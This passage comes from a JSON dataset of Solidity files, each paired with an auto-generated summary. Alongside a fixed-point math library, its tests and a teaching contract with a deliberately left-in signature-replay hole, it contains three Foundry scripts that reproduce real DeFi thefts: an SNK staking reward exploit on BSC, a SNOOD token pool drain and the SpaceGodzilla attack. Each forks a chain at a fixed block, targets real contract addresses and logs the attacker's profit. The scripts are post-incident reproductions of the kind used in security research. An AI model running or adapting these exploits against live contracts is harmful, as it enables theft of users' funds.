y = x + 1346386616545796478920950773328;\n        y = ((y * x) >> 96) + 57155421227552351082224309758442;\n        int256 p = y + x - 94201549194550492254356042504812;\n        p = ((p * y) >> 96) + 28719021644029726153956944680412240;\n        p = p * x + (4385272521454847904659076985693276 << 96);\n\n        // We leave p in 2**192 basis so we don't need to scale it back up for the division.\n        int256 q = x - 2855989394907223263936484059900;\n        q = ((q * x) >> 96) + 50020603652535783019961831881945;\n        q = ((q * x) >> 96) - 533845033583426703283633433725380;\n        q = ((q * x) >> 96) + 3604857256930695427073651918091429;\n        q = ((q * x) >> 96) - 14423608567350463180887372962807573;\n        q = ((q * x) >> 96) + 26449188498355588339934803723976023;\n\n        /// @solidity memory-safe-assembly\n        assembly {\n            // Div in assembly because solidity adds a zero check despite the unchecked.\n            // The q polynomial won't have zeros in the domain as all its roots are complex.\n            // No scaling is necessary because p is already 2**96 too large.\n            r := sdiv(p, q)\n        }\n\n        // r should be in the range (0.09, 0.25) * 2**96.\n\n        // We now need to multiply r by:\n        // * the scale factor s = ~6.031367120.\n        // * the 2**k factor from the range reduction.\n        // * the 1e18 / 2**96 factor for base conversion.\n        // We do this all at once, with an intermediate result in 2**213\n        // basis, so the final right shift is always by a positive amount.\n        r = int256((uint256(r) * 3822833074963236453042738258902158003155416615667) >> uint256(195 - k));\n    }\n}\n\nfunction wadLn(int256 x) pure returns (int256 r) {\n    unchecked {\n        require(x > 0, \"UNDEFINED\");\n\n        // We want to convert x from 10**18 fixed point to 2**96 fixed point.\n        // We do this by multiplying by 2**96 / 10**18. But since\n        // ln(x * C) = ln(x) + ln(C), we can simply do nothing here\n        // and add ln(2**96 / 10**18) at the end.\n\n        /// @solidity memory-safe-assembly\n        assembly {\n            r := shl(7, lt(0xffffffffffffffffffffffffffffffff, x))\n            r := or(r, shl(6, lt(0xffffffffffffffff, shr(r, x))))\n            r := or(r, shl(5, lt(0xffffffff, shr(r, x))))\n            r := or(r, shl(4, lt(0xffff, shr(r, x))))\n            r := or(r, shl(3, lt(0xff, shr(r, x))))\n            r := or(r, shl(2, lt(0xf, shr(r, x))))\n            r := or(r, shl(1, lt(0x3, shr(r, x))))\n            r := or(r, lt(0x1, shr(r, x)))\n        }\n\n        // Reduce range of x to (1, 2) * 2**96\n        // ln(2^k * x) = k * ln(2) + ln(x)\n        int256 k = r - 96;\n        x <<= uint256(159 - k);\n        x = int256(uint256(x) >> 159);\n\n        // Evaluate using a (8, 8)-term rational approximation.\n        // p is made monic, we will multiply by a scale factor later.\n        int256 p = x + 3273285459638523848632254066296;\n        p = ((p * x) >> 96) + 24828157081833163892658089445524;\n        p = ((p * x) >> 96) + 43456485725739037958740375743393;\n        p = ((p * x) >> 96) - 11111509109440967052023855526967;\n        p = ((p * x) >> 96) - 45023709667254063763336534515857;\n        p = ((p * x) >> 96) - 14706773417378608786704636184526;\n        p = p * x - (795164235651350426258249787498 << 96);\n\n        // We leave p in 2**192 basis so we don't need to scale it back up for the division.\n        // q is monic by convention.\n        int256 q = x + 5573035233440673466300451813936;\n        q = ((q * x) >> 96) + 71694874799317883764090561454958;\n        q = ((q * x) >> 96) + 283447036172924575727196451306956;\n        q = ((q * x) >> 96) + 401686690394027663651624208769553;\n        q = ((q * x) >> 96) + 204048457590392012362485061816622;\n        q = ((q * x) >> 96) + 31853899698501571402653359427138;\n        q = ((q * x) >> 96) + 909429971244387300277376558375;\n        /// @solidity memory-safe-assembly\n        assembly {\n            // Div in assembly because solidity adds a zero check despite the unchecked.\n            // The q polynomial is known not to have zeros in the domain.\n            // No scaling required because p is already 2**96 too large.\n            r := sdiv(p, q)\n        }\n\n        // r is in the range (0, 0.125) * 2**96\n\n        // Finalization, we need to:\n        // * multiply by the scale factor s = 5.549\u2026\n        // * add ln(2**96 / 10**18)\n        // * add k * ln(2)\n        // * multiply by 10**18 / 2**96 = 5**18 >> 78\n\n        // mul s * 5e18 * 2**96, base is now 5**18 * 2**192\n        r *= 1677202110996718588342820967067443963516166;\n        // add ln(2) * k * 5e18 * 2**192\n        r += 16597577552685614221487285958193947469193820559219878177908093499208371 * k;\n        // add ln(2**96 / 10**18) * 5e18 * 2**192\n        r += 600920179829731861736702779321621459595472258049074101567377883020018308;\n        // base conversion: mul 2**18 / 2**192\n        r >>= 174;\n    }\n}\n\n/// @dev Will return 0 instead of reverting if y is zero.\nfunction unsafeDiv(int256 x, int256 y) pure returns (int256 r) {\n    /// @solidity memory-safe-assembly\n    assembly {\n        // Divide x by y.\n        r := sdiv(x, y)\n    }\n}\n",
        "summary": "This is a Solidity library for performing fixed-point arithmetic with 18 decimal points (wad). It includes functions for converting between integers and wads, multiplying and dividing wad values, and exponentiating wad values. The functions are marked as unsafe because they do not check for potential overflow or divide-by-zero errors. Some functions also include an assembly code for optimized performance. The library is licensed under the MIT license.",
        "id": "351b9f48-4ed9-4da0-b109-0a32c5242c8c"
    },
    {
        "code": "// SPDX-License-Identifier: MIT\npragma solidity >=0.8.0;\n\nimport {DSTestPlus} from \"./utils/DSTestPlus.sol\";\n\nimport {wadMul, wadDiv} from \"../utils/SignedWadMath.sol\";\n\ncontract SignedWadMathTest is DSTestPlus {\n    function testWadMul(\n        uint256 x,\n        uint256 y,\n        bool negX,\n        bool negY\n    ) public {\n        x = bound(x, 0, 99999999999999e18);\n        y = bound(x, 0, 99999999999999e18);\n\n        int256 xPrime = negX ? -int256(x) : int256(x);\n        int256 yPrime = negY ? -int256(y) : int256(y);\n\n        assertEq(wadMul(xPrime, yPrime), (xPrime * yPrime) / 1e18);\n    }\n\n    function testFailWadMulOverflow(int256 x, int256 y) public pure {\n        // Ignore cases where x * y does not overflow.\n        unchecked {\n            if ((x * y) / x == y) revert();\n        }\n\n        wadMul(x, y);\n    }\n\n    function testWadDiv(\n        uint256 x,\n        uint256 y,\n        bool negX,\n        bool negY\n    ) public {\n        x = bound(x, 0, 99999999e18);\n        y = bound(x, 1, 99999999e18);\n\n        int256 xPrime = negX ? -int256(x) : int256(x);\n        int256 yPrime = negY ? -int256(y) : int256(y);\n\n        assertEq(wadDiv(xPrime, yPrime), (xPrime * 1e18) / yPrime);\n    }\n\n    function testFailWadDivOverflow(int256 x, int256 y) public pure {\n        // Ignore cases where x * WAD does not overflow or y is 0.\n        unchecked {\n            if (y == 0 || (x * 1e18) / 1e18 == x) revert();\n        }\n\n        wadDiv(x, y);\n    }\n\n    function testFailWadDivZeroDenominator(int256 x) public pure {\n        wadDiv(x, 0);\n    }\n}\n",
        "summary": "This is a Solidity smart contract that tests the functionality of two utility functions in the SignedWadMath.sol library: `wadMul()` and `wadDiv()`. The tests include handling overflow and dividing by zero errors. The `testWadMul()` function tests the multiplication of two numbers in wad units, which are decimal numbers with 18 decimal places. The `testWadDiv()` function tests the division of two numbers in wad units. If any of the tests fail, the contract will revert.",
        "id": "d81fec22-c418-4275-9f65-49c54458b5f7"
    },
    {
        "code": "// SPDX-License-Identifier: MIT\npragma solidity ^0.8.4;\n\nimport \"@openzeppelin/contracts/token/ERC20/ERC20.sol\";\nimport \"@openzeppelin/contracts/access/Ownable.sol\";\nimport \"@openzeppelin/contracts/utils/cryptography/ECDSA.sol\";\n\n// \u6743\u9650\u7ba1\u7406\u9519\u8bef\u4f8b\u5b50\ncontract SigReplay is ERC20 {\n\n    address public signer;\n\n    // \u6784\u9020\u51fd\u6570\uff1a\u521d\u59cb\u5316\u4ee3\u5e01\u540d\u79f0\u548c\u4ee3\u53f7\n    constructor() ERC20(\"SigReplay\", \"Replay\") {\n        signer = msg.sender;\n    }\n    \n    /**\n     * \u6709\u7b7e\u540d\u91cd\u8bbf\u6f0f\u6d1e\u7684\u94f8\u9020\u51fd\u6570\n     * to: 0x5B38Da6a701c568545dCfcB03FcB875f56beddC4\n     * amount: 1000\n     * \u7b7e\u540d\uff1a 0x5a4f1ad4d8bd6b5582e658087633230d9810a0b7b8afa791e3f94cc38947f6cb1069519caf5bba7b975df29cbfdb4ada355027589a989435bf88e825841452f61b\n     */\n    function badMint(address to, uint amount, bytes memory signature) public {\n        bytes32 _msgHash = toEthSignedMessageHash(getMessageHash(to, amount));\n        require(verify(_msgHash, signature), \"Invalid Signer!\");\n        _mint(to, amount);\n    }\n\n    /**\n     * \u5c06to\u5730\u5740\uff08address\u7c7b\u578b\uff09\u548camount\uff08uint256\u7c7b\u578b\uff09\u62fc\u6210\u6d88\u606fmsgHash\n     * to: 0x5B38Da6a701c568545dCfcB03FcB875f56beddC4\n     * amount: 1000\n     * \u5bf9\u5e94\u7684\u6d88\u606fmsgHash: 0xb4a4ba10fbd6886a312ec31c54137f5714ddc0e93274da8746a36d2fa96768be\n     */\n    function getMessageHash(address to, uint256 amount) public pure returns(bytes32){\n        return keccak256(abi.encodePacked(to, amount));\n    }\n\n    /**\n     * @dev \u83b7\u5f97\u4ee5\u592a\u574a\u7b7e\u540d\u6d88\u606f\n     * `hash`\uff1a\u6d88\u606f\u54c8\u5e0c \n     * \u9075\u4ece\u4ee5\u592a\u574a\u7b7e\u540d\u6807\u51c6\uff1ahttps://eth.wiki/json-rpc/API#eth_sign[`eth_sign`]\n     * \u4ee5\u53ca`EIP191`:https://eips.ethereum.org/EIPS/eip-191`\n     * \u6dfb\u52a0\"\\x19Ethereum Signed Message:\\n32\"\u5b57\u6bb5\uff0c\u9632\u6b62\u7b7e\u540d\u7684\u662f\u53ef\u6267\u884c\u4ea4\u6613\u3002\n     */\n    function toEthSignedMessageHash(bytes32 hash) public pure returns (bytes32) {\n        // 32 is the length in bytes of hash,\n        // enforced by the type signature above\n        return keccak256(abi.encodePacked(\"\\x19Ethereum Signed Message:\\n32\", hash));\n    }\n\n    // ECDSA\u9a8c\u8bc1\n    function verify(bytes32 _msgHash, bytes memory _signature) public view returns (bool){\n        return ECDSA.recover(_msgHash, _signature) == signer;\n    }\n\n\n    mapping(address => bool) public mintedAddress;   // \u8bb0\u5f55\u5df2\u7ecfmint\u7684\u5730\u5740\n    \n    function goodMint(address to, uint amount, bytes memory signature) public {\n        bytes32 _msgHash = toEthSignedMessageHash(getMessageHash(to, amount));\n        require(verify(_msgHash, signature), \"Invalid Signer!\");\n        // \u68c0\u67e5\u8be5\u5730\u5740\u662f\u5426mint\u8fc7\n        require(!mintedAddress[to], \"Already minted\");\n        // \u8bb0\u5f55mint\u8fc7\u7684\u5730\u5740\n        mintedAddress[to] = true;\n        _mint(to, amount);\n    }\n    \n    uint nonce;\n\n    function nonceMint(address to, uint amount, bytes memory signature) public {\n        bytes32 _msgHash = toEthSignedMessageHash(keccak256(abi.encodePacked(to, amount, nonce, block.chainid)));\n        require(verify(_msgHash, signature), \"Invalid Signer!\");\n        _mint(to, amount);\n        nonce++;\n    }\n}",
        "summary": "This is a Solidity smart contract that creates a token and has three functions related to minting new tokens. The first function, `badMint`, allows anyone to mint tokens by passing in an address, an amount, and a signature. However, this function has a vulnerability called a replay attack, where the same signature can be used to mint tokens multiple times. The second function, `goodMint`, fixes the vulnerability by checking if an address has already been minted before performing the minting operation. The third function, `nonceMint`, also fixes the vulnerability by using a nonce that increases with each minting operation and including the chain ID in the message hash.",
        "id": "a35f59d4-67ff-471b-acbf-580578997586"
    },
    {
        "code": "// SPDX-License-Identifier: UNLICENSED\npragma solidity ^0.8.10;\n\nimport \"forge-std/Test.sol\";\nimport \"./interface.sol\";\n\n// @Analysis\n// https://twitter.com/Phalcon_xyz/status/1656176776425644032\n// @TX\n// https://explorer.phalcon.xyz/tx/bsc/0xace112925935335d0d7460a2470a612494f910467e263c7ff477221deee90a2c\n// https://explorer.phalcon.xyz/tx/bsc/0x7394f2520ff4e913321dd78f67dd84483e396eb7a25cbb02e06fe875fc47013a\n// @Summary\n// parent `rewardPerToken`, but times all children's balance\n\n\ninterface IPancakeRouter01 {\n    function factory() external pure returns (address);\n    function WETH() external pure returns (address);\n\n    function addLiquidity(\n        address tokenA,\n        address tokenB,\n        uint amountADesired,\n        uint amountBDesired,\n        uint amountAMin,\n        uint amountBMin,\n        address to,\n        uint deadline\n    ) external returns (uint amountA, uint amountB, uint liquidity);\n    function addLiquidityETH(\n        address token,\n        uint amountTokenDesired,\n        uint amountTokenMin,\n        uint amountETHMin,\n        address to,\n        uint deadline\n    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);\n    function removeLiquidity(\n        address tokenA,\n        address tokenB,\n        uint liquidity,\n        uint amountAMin,\n        uint amountBMin,\n        address to,\n        uint deadline\n    ) external returns (uint amountA, uint amountB);\n    function removeLiquidityETH(\n        address token,\n        uint liquidity,\n        uint amountTokenMin,\n        uint amountETHMin,\n        address to,\n        uint deadline\n    ) external returns (uint amountToken, uint amountETH);\n    function removeLiquidityWithPermit(\n        address tokenA,\n        address tokenB,\n        uint liquidity,\n        uint amountAMin,\n        uint amountBMin,\n        address to,\n        uint deadline,\n        bool approveMax, uint8 v, bytes32 r, bytes32 s\n    ) external returns (uint amountA, uint amountB);\n    function removeLiquidityETHWithPermit(\n        address token,\n        uint liquidity,\n        uint amountTokenMin,\n        uint amountETHMin,\n        address to,\n        uint deadline,\n        bool approveMax, uint8 v, bytes32 r, bytes32 s\n    ) external returns (uint amountToken, uint amountETH);\n    function swapExactTokensForTokens(\n        uint amountIn,\n        uint amountOutMin,\n        address[] calldata path,\n        address to,\n        uint deadline\n    ) external returns (uint[] memory amounts);\n    function swapTokensForExactTokens(\n        uint amountOut,\n        uint amountInMax,\n        address[] calldata path,\n        address to,\n        uint deadline\n    ) external returns (uint[] memory amounts);\n    function swapExactETHForTokens(uint amountOutMin, address[] calldata path, address to, uint deadline)\n        external\n        payable\n        returns (uint[] memory amounts);\n    function swapTokensForExactETH(uint amountOut, uint amountInMax, address[] calldata path, address to, uint deadline)\n        external\n        returns (uint[] memory amounts);\n    function swapExactTokensForETH(uint amountIn, uint amountOutMin, address[] calldata path, address to, uint deadline)\n        external\n        returns (uint[] memory amounts);\n    function swapETHForExactTokens(uint amountOut, address[] calldata path, address to, uint deadline)\n        external\n        payable\n        returns (uint[] memory amounts);\n\n    function quote(uint amountA, uint reserveA, uint reserveB) external pure returns (uint amountB);\n    function getAmountOut(uint amountIn, uint reserveIn, uint reserveOut) external pure returns (uint amountOut);\n    function getAmountIn(uint amountOut, uint reserveIn, uint reserveOut) external pure returns (uint amountIn);\n    function getAmountsOut(uint amountIn, address[] calldata path) external view returns (uint[] memory amounts);\n    function getAmountsIn(uint amountOut, address[] calldata path) external view returns (uint[] memory amounts);\n}\ninterface IPancakeCallee {\n    function pancakeCall(address sender, uint amount0, uint amount1, bytes calldata data) external;\n}\ninterface ISNKMinter {\n    function bindParent(address parent) external;\n    function stake(uint256 amount) external;\n    function getReward() external;\n    function exit() external;\n}\n\n\ncontract SNKExp is Test, IPancakeCallee {\n    IERC20 SNKToken = IERC20(0x05e2899179003d7c328de3C224e9dF2827406509);\n    ISNKMinter minter = ISNKMinter(0xA3f5ea945c4970f48E322f1e70F4CC08e70039ee);\n    IPancakePair pool = IPancakePair(0x7957096Bd7324357172B765C4b0996Bb164ebfd4);\n    IERC20 BUSD = IERC20(0x55d398326f99059fF775485246999027B3197955);\n    IPancakeRouter router = IPancakeRouter(payable(0x10ED43C718714eb63d5aA57B78B54704E256024E));\n    CheatCodes cheats = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);\n    address[] public parents;\n\n    function setUp() public {\n        cheats.createSelectFork(\"bsc\", 27784455);\n        deal(address(SNKToken), address(this), 1000 ether);\n        for (uint i = 0; i < 10; ++ i) {\n            HackerTemplate t1 = new HackerTemplate();\n            SNKToken.transfer(address(t1), 100 ether);\n            t1.stake();\n            parents.push(address(t1));\n        }\n        uint startTime = block.timestamp;\n        vm.warp(startTime + 20 days);\n        SNKToken.approve(address(router), type(uint256).max);\n        SNKToken.approve(address(pool), type(uint256).max);\n    }\n\n    function testNormal() external {\n        for (uint i = 0; i < 10; ++ i) {\n            HackerTemplate t = HackerTemplate(parents[i]);\n            t.exit2();\n        }\n        address[] memory path = new address[](2);\n        path[0] = address(SNKToken);\n        path[1] = (address(BUSD));\n        emit log_named_decimal_uint(\"Normal SNK Amount should get\", SNKToken.balanceOf(address(this)), 18);\n        router.swapExactTokensForTokensSupportingFeeOnTransferTokens(\n            SNKToken.balanceOf(address(this)),\n            0,\n            path,\n            address(this),\n            block.timestamp + 1000\n        );\n        emit log_named_decimal_uint(\"Normal BUSD Amount should get\", BUSD.balanceOf(address(this)), 18);\n    }\n\n    function testExp() external {\n        pool.swap(80000 ether, 0, address(this), bytes(\"0x123\"));\n\n\n        address[] memory path = new address[](2);\n        path[0] = address(SNKToken);\n        path[1] = (address(BUSD));\n        emit log_named_decimal_uint(\"EXP SNK Amount get\", SNKToken.balanceOf(address(this)), 18);\n        router.swapExactTokensForTokensSupportingFeeOnTransferTokens(\n            SNKToken.balanceOf(address(this)),\n            0,\n            path,\n            address(this),\n            block.timestamp + 1000\n        );\n        emit log_named_decimal_uint(\"EXP BUSD Amount get\", BUSD.balanceOf(address(this)), 18);\n    }\n\n    function pancakeCall(address sender, uint amount0, uint amount1, bytes calldata data) external {\n        for (uint i = 0; i < 10; ++ i) {\n            HackerTemplate t1 = new HackerTemplate();\n            HackerTemplate t = HackerTemplate(parents[i]);\n            t1.bind(parents[i]);\n            SNKToken.transfer(address(t1), SNKToken.balanceOf(address(this)));\n            t1.stake();\n            t.exit2();\n            t1.exit1();\n        }\n        SNKToken.transfer(address(pool), 85000 ether);\n    }\n}\n\ncontract HackerTemplate {\n\n    IERC20 SNKToken = IERC20(0x05e2899179003d7c328de3C224e9dF2827406509);\n    ISNKMinter minter = ISNKMinter(0xA3f5ea945c4970f48E322f1e70F4CC08e70039ee);\n    address public owner;\n\n    constructor() {\n        owner = msg.sender;\n    }\n\n    modifier onlyOwner() {\n        require(msg.sender == owner, \"onlyOwner\");\n        _;\n    }\n\n    function stake() public onlyOwner{\n        SNKToken.approve(address(minter), SNKToken.balanceOf(address(this)));\n        minter.stake(SNKToken.balanceOf(address(this)));\n    }\n\n    function bind(address p) public onlyOwner{\n        minter.bindParent(p);\n    }\n\n    function exit1() public onlyOwner{\n        minter.exit();\n        SNKToken.transfer(owner, SNKToken.balanceOf(address(this)));\n    }\n\n    function exit2() public onlyOwner{\n        minter.getReward();\n        minter.exit();\n        SNKToken.transfer(owner, SNKToken.balanceOf(address(this)));\n    }\n}",
        "summary": "This is a Solidity smart contract that has multiple functions. The contract interacts with other contracts such as PancakeSwap, SNKToken, and ISNKMinter. The functions are designed to test for potential exploits in the smart contracts it interacts with. The contract creates new instances of HackerTemplate, then staking and adding them into a list of parent addresses. It has two primary functions, testNormal() and testExp(). testExp() calls pancakeCall(), which then creates new instances of HackerTemplate, staking and linking them to the parent addresses in the list. The SNKToken is then transferred to the Pancake pair pool and swapped for BUSD.",
        "id": "3282db0f-8d57-449c-b587-b41f9ef7600b"
    },
    {
        "code": "// SPDX-License-Identifier: UNLICENSED\npragma solidity 0.8.10;\n\nimport \"forge-std/Test.sol\";\nimport \"./interface.sol\";\n\ninterface IUNIPAIR is IERC20 {\n  function sync() external;\n\n  function getReserves()\n    external\n    returns (\n      uint112 reserve0,\n      uint112 reserve1,\n      uint32 blockTimestampLast\n    );\n\n  function swap(\n    uint256 amount0Out,\n    uint256 amount1Out,\n    address to,\n    bytes calldata data\n  ) external;\n}\n\ncontract ContractTest is DSTest {\n  IERC20 SNOOD = IERC20(0xD45740aB9ec920bEdBD9BAb2E863519E59731941);\n  IERC20 WETH = IERC20(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2);\n\n  IUNIPAIR uniLP = IUNIPAIR(0x0F6b0960d2569f505126341085ED7f0342b67DAe);\n  CheatCodes cheats = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);\n\n  function setUp() public {\n    cheats.createSelectFork(\"mainnet\", 14983660); //fork mainnet at block 14983660\n  }\n\n  function testExploit() public {\n    // address attacker = vm.addr(1);\n    address attacker = 0x180ea08644b123D8A3f0ECcf2a3b45A582075538;\n    emit log(\"before the attack\");\n    emit log_uint(WETH.balanceOf(attacker));\n    assertTrue(WETH.balanceOf(attacker) == 0);\n\n    uint256 balance = SNOOD.balanceOf(address(uniLP));\n    require(SNOOD.transferFrom(address(uniLP), address(this), balance - 1));\n    uniLP.sync();\n\n    require(SNOOD.transfer(address(uniLP), balance - 1));\n\n    (uint112 a, uint112 b, ) = uniLP.getReserves();\n\n    uint256 amount0Out;\n    if (b * 10000 + (balance - 1) * 9970 == 0) {\n      amount0Out = 0;\n    } else {\n      amount0Out =\n        ((balance - 1) * 9970 * a) /\n        (b * 10000 + (balance - 1) * 9970);\n    }\n\n    uniLP.swap(amount0Out, 0, attacker, \"\");\n\n    emit log(\"WETH after the attack\");\n    emit log_uint(WETH.balanceOf(attacker));\n\n    assertTrue(WETH.balanceOf(attacker) > 0);\n  }\n}\n",
        "summary": "This code defines a Solidity contract that tests an exploit that can be performed on a specific Ethereum-based decentralized exchange (DEX) pool. The contract imports the necessary interfaces and then defines a `setUp` function that creates a fork of the Ethereum mainnet at a specific block height. The contract also defines a `testExploit` function that performs the attack by manipulating balance and reserve values in the pool and then swaps tokens to steal WETH tokens from the pool. The test passes if the attacker's WETH balance is greater than zero after the attack.",
        "id": "fb7074d3-6d12-460e-8f56-1f6ba4346779"
    },
    {
        "code": "// SPDX-License-Identifier: UNLICENSED\npragma solidity ^0.8.10;\n\nimport \"forge-std/Test.sol\";\nimport \"./interface.sol\";\n\n/* @KeyInfo - Total Lost : 25,378 BUSD\n    Attacker Wallet : https://bscscan.com/address/0x00a62eb08868ec6feb23465f61aa963b89e57e57\n    Attack Contract : https://bscscan.com/address/0x3d817ea746edd02c088c4df47c0ece0bd28dcd72\n    SpaceGodzilla : https://bscscan.com/address/0x2287c04a15bb11ad1358ba5702c1c95e2d13a5e0\n    Attack Tx : https://bscscan.com/tx/0x7f183df11f1a0225b5eb5bb2296b5dc51c0f3570e8cc15f0754de8e6f8b4cca4\n*/\n\n/* @News\n    BlockSec : https://mobile.twitter.com/BlockSecTeam/status/1547456591900749824\n    PANews : https://www.panewslab.com/zh_hk/articledetails/u25j5p3kdvu9.html\n*/\n\n/* @Reports\n    Numen Cyber Labs : https://medium.com/numen-cyber-labs/spacegodzilla-attack-event-analysis-d29a061b17e1\n    Learnblockchain.cn Analysis : https://learnblockchain.cn/article/4396\n    Learnblockchain.cn Analysis : https://learnblockchain.cn/article/4395\n*/\n\n/*  We skipped the part where the attacker made a flashloan with 16 pools to get the initial capital\nHere are the pools that attacker borrowed:\naddress constant pool1 = 0x203e062964500808151E069Eda017097E510B710;    // BUSD/GERA Pool\naddress constant pool2 = 0x535Ae122657E5F17FB03540A98BF9F494a06e2A4;    // BUSD/BABBC Pool\naddress constant pool3 = 0xa91E7d767FFdbFF64a955f32E8E3F08AfaB3047b;    // WBNB/Fei Pool\naddress constant pool4 = 0x0e15e47C3DE9CD92379703cf18251a2D13E155A7;    // DBTC/USDT Pool\naddress constant pool5 = 0x409E377A7AfFB1FD3369cfc24880aD58895D1dD9;    // TUF/USDT Pool\naddress constant pool6 = 0x8A1C25e382B80E7860DB1ae619E1Fc92a0cd7104;    // FREY/USDT Pool\naddress constant pool7 = 0x409E377A7AfFB1FD3369cfc24880aD58895D1dD9;    // Leek/USDT Pool\naddress constant pool8 = 0x409E377A7AfFB1FD3369cfc24880aD58895D1dD9;    // CC/BUSD Pool\naddress constant pool9 = 0x409E377A7AfFB1FD3369cfc24880aD58895D1dD9;    // ASET/USDT Pool\naddress constant pool10 = 0xb19265426ce5bC1E015C0c503dFe6EF7c407a406;   // USX/BUSD Pool\naddress constant pool11 = 0xe3C58d202D4047Ba227e437b79871d51982deEb7;   // BTCB/BUSD Pool   DSPFlashLoanCall\naddress constant pool12 = 0x9BA8966B706c905E594AcbB946Ad5e29509f45EB;   // ETH/BUSD Pool    DPPFlashLoanCall\naddress constant pool13 = 0x6098A5638d8D7e9Ed2f952d35B2b67c34EC6B476;   // WBNB/USDT Pool   DPPFlashLoanCall\naddress constant pool14 = 0x0fe261aeE0d1C4DFdDee4102E82Dd425999065F4;   // WBNB/BUSD Pool   DPPFlashLoanCall\naddress constant pool15 = 0x409E377A7AfFB1FD3369cfc24880aD58895D1dD9;   // ANTEX/BUSD Pool\naddress constant pool16 = 0xD534fAE679f7F02364D177E9D44F1D15963c0Dd7;   // DODO/WBNB Pool\n*/\n\n\ninterface ISpaceGodzilla {\n    function swapAndLiquifyStepv1() external;\n    function swapTokensForOther(uint256 tokenAmount) external;\n}\n\n\ncontract AttackContract is Test {\n    using stdStorage for StdStorage;\n    CheatCodes constant cheat = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);\n    address USDT = 0x55d398326f99059fF775485246999027B3197955;\n    address CakeLP = 0x8AfF4e8d24F445Df313928839eC96c4A618a91C8;    // SpaceGodzilla/USDT LP Pool\n    address SpaceGodzilla = 0x2287C04a15bb11ad1358BA5702C1C95E2D13a5E0;\n\n    constructor() {\n        cheat.createSelectFork(\"bsc\", 19523980);    // Fork BSC mainnet at block 19523981\n        cheat.label(address(this), \"AttackContract\");\n        cheat.label(USDT, \"USDT\");\n        cheat.label(CakeLP, \"CakeLP\");\n        cheat.label(SpaceGodzilla, \"SpaceGodzilla\");\n\n        emit log_string(\"This reproduce shows how attacker exploit SpaceGodzilla, cause 25,378 BUSD lost\");\n        emit log_string(\"[Note] We skipped the part where the attacker made a flash loan with 16 pools to get the initial capital\");\n\n        // Attacker flashloan 16 pools, to borrow 2.95 millon USDT as initial capital\n        stdstore.target(USDT)\n                .sig(IERC20(USDT).balanceOf.selector)\n                .with_key(address(this))\n                .checked_write(2952797730003166405412733);\n        uint256 usdt_balance = IERC20(USDT).balanceOf(address(this));\n        assert(usdt_balance == 2952797730003166405412733);\n        \n    }\n\n\n    function testExploit() public {\n        uint256 init_capital = IERC20(USDT).balanceOf(address(this));\n        emit log_named_decimal_uint(\"[info] Attacker USDT Balance\", init_capital, 18);\n        \n        // ========================================================\n        ISpaceGodzilla(SpaceGodzilla).swapTokensForOther(69127461036369179405415017714);\n        (uint r0, uint r1, ) = Uni_Pair_V2(CakeLP).getReserves();\n        assert(r0 == 76041697635825849047705725848735);\n        assert(r1 == 90478604689102338898952);\n        // ========================================================\n        uint256 usdt_balance = IERC20(USDT).balanceOf(address(this));\n        uint256 trans_usdt_balance = usdt_balance - 100000;\n        bool suc = IERC20(USDT).transfer(CakeLP, trans_usdt_balance);\n        require(suc, \"Transfer Failed\");\n        // ========================================================\n        uint256 amount0Out = r0 - (r0 * 30 / 1000);\n        emit log_named_uint(\"First swap amount0Out\", amount0Out);\n        Uni_Pair_V2(CakeLP).swap(amount0Out, 0, address(this), '');     // 73,775,430,786,944,730,258,898,675,433,018 \u53ef\u80fd\u6703\u8b8a\u52d5\uff0c\u56e0\u70ba\u4e0d\u77e5\u9053\u653b\u64ca\u8005\u600e\u9ebc\u7b973\uff05\u624b\u7e8c\u8cbb\n        // ========================================================\n        ISpaceGodzilla(SpaceGodzilla).swapAndLiquifyStepv1();\n        // ========================================================\n        uint256 SpaceGodzilla_balance = IERC20(SpaceGodzilla).balanceOf(address(this)); //  71,562,167,863,336,388,351,131,715,170,010 \u53ef\u80fd\u6703\u8b8a\u52d5\uff0c\u56e0\u70ba\u4e0d\u77e5\u9053\u653b\u64ca\u8005\u600e\u9ebc\u7b973\uff05\u624b\u7e8c\u8cbb\n        emit log_named_uint(\"address(this) SpaceGodzilla_balance\", SpaceGodzilla_balance);\n        // ========================================================\n        (r0, r1, ) = Uni_Pair_V2(CakeLP).getReserves(); // 2,288,901,594,081,170,758,102,038,305,061     3,073,671,601,005,728,817,436,539\n        assert(r1 == 3073671601005728817436539);\n        // ========================================================\n        suc = IERC20(USDT).transfer(CakeLP, 20000);\n        require(suc, \"Transfer Failed\");\n        // ========================================================\n        suc = IERC20(SpaceGodzilla).transfer(CakeLP, SpaceGodzilla_balance);  // Transfer \u6240\u6709 SpaceGodzilla \u7d66 LP\n        require(suc, \"Transfer Failed\");\n        // ========================================================\n        uint256 LP_SpaceGodzilla_balance = IERC20(SpaceGodzilla).balanceOf(address(CakeLP));\n        emit log_named_uint(\"address(CakeLP) SpaceGodzilla_balance\", LP_SpaceGodzilla_balance); // 73,851,069,457,417,559,109,233,753,475,071 \u53ef\u80fd\u6703\u8b8a\u52d5\uff0c\u56e0\u70ba\u4e0d\u77e5\u9053\u653b\u64ca\u8005\u600e\u9ebc\u7b973\uff05\u624b\u7e8c\u8cbb\n        // ========================================================\n        uint256 amount1Out = r1 - (r1 * 32 / 1000);\n        emit log_named_uint(\"First swap amount1Out\", amount1Out);   // 2,978,176,485,325,154,862,214,560\n        Uni_Pair_V2(CakeLP).swap(0, amount1Out, address(this), '');\n\n        // ========================================================\n        usdt_balance = IERC20(USDT).balanceOf(address(this));\n        emit log_named_decimal_uint(\"[info] Attacker Wallet USDT Balance\", usdt_balance, 18);\n\n        require(usdt_balance > init_capital, \"Exploit Failed, attacker take losses\");\n        uint256 profit = usdt_balance - init_capital;\n        emit log_named_decimal_uint(\"[Profit] Attacker Wallet USDT Profit\", profit, 18);\n    }\n\n  receive() external payable {}\n}\n",
        "summary": "This code is an attack contract that exploits a vulnerability in the SpaceGodzilla smart contract. The attacker made a flashloan with 16 pools to get an initial capital of 2.95 million USDT. The attack consists of swapping tokens for other tokens, transferring tokens to a liquidity pool, swapping tokens in the pool, and ultimately making a profit. The attack shows how an attacker can exploit a vulnerability in a smart contract to cause significant financial loss. The code also includes references to articles and analysis of the attack.",
        "id": "fe21893d-a7a6-41e2-a084-02d15e2cd67d"
    },
    {
